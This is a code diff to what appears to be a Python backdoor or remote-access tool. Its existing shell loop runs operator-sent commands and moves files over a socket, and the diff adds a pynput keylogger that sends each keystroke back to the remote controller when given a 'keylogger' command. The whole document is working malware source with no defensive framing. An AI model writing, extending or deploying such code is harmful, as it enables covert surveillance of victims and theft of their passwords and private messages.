@@ -68,6 +68,29 @@ def download_file(file_name):
     s.settimeout(None)  # Reset the timeout setting
     f.close()  # Close the file when done
 
+def keylogger():
+    from pynput import keyboard
+
+    def on_press(key):
+        try:
+            if hasattr(key, 'char') and key.char:
+                reliable_send(f'{key.char}')
+            else:
+                reliable_send(f'{key.name}')  # Send the name of the special key
+        except Exception as e:
+            reliable_send(str(e))
+
+
+    def on_release(key):
+        if key == keyboard.Key.esc:
+            # Stop listener
+            return False
+            
+
+    # Collect events until released
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
 
 # Main shell function for command execution
 def shell():
@@ -90,6 +113,8 @@ def shell():
         elif command[:6] == 'upload':
             # If the command starts with 'upload', download a file from the remote host
             download_file(command[7:])
+        elif command == 'keylogger':
+            keylogger()
         else:
             # For other commands, execute them using subprocess
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
